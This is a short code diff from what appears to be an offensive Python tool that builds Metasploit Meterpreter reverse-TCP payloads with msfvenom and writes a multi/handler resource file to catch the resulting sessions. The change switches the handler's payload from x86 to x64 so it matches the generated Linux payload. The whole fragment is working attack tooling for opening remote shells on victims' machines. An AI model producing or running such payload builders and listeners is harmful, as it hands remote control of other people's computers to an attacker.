@@ -84,7 +84,7 @@ if choice == '2':
     # os.system('sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')
     os.system('sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f exe -o windows.exe')
 
-    write_file('Linux.rc', 'use multi/handler\nset payload linux/x86/meterpreter_reverse_tcp\nset LHOST ' + LHOST + '\nset LPORT ' + LPORT + '\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n')
+    write_file('Linux.rc', 'use multi/handler\nset payload linux/x64/meterpreter_reverse_tcp\nset LHOST ' + LHOST + '\nset LPORT ' + LPORT + '\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n')
     Linux_metasploit()
 
 if choice == '3':
